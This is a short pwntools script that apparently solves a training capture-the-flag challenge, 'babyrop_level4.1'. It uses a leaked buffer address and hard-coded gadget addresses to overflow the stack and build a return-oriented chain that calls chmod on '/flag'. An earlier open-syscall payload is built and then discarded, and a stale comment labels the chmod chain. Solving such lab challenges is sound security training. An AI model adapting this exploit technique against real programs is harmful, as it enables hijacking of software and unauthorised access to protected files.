from pwn import *

context.log_level = 'debug'
offset = b'a' * 48 #56 is offset between buf and ret addr

poprax_ret = p64(0x401aee)
poprdi_ret = p64(0x401b15)
poprsi_ret = p64(0x401af5)
poprdx_ret = p64(0x401ae5)
syscall    = p64(0x401afd)


r = process('/challenge/babyrop_level4.1')

r.recvuntil(b'[LEAK] Your input buffer is located at:')
buf = int(r.recvn(15), 16) #also the address of /flag
print(f'Buf: {hex(buf)}')

payload = b'/flag\x00\x00\x00'                      #null byte to get the correct string
payload += offset

#I will open '/flag'
payload += poprax_ret
payload += p64(0x02)                                #syscall open
payload += poprdi_ret
payload += p64(buf)                                 #pointer to string
payload += poprsi_ret
payload += p64(0)
payload += syscall


payload = b'/flag\x00\x00\x00'
payload += offset

#I will open '/flag'
payload += poprax_ret
payload += p64(0x5a)                #chmod syscall
payload += poprdi_ret
payload += p64(buf)                 #pointer string
payload += poprsi_ret
payload += p64(0x4)                 
payload += syscall


r.recvuntil(b'\n')
with open("run", 'wb') as file:
    file.write(payload)
r.sendline(payload)

r.interactive()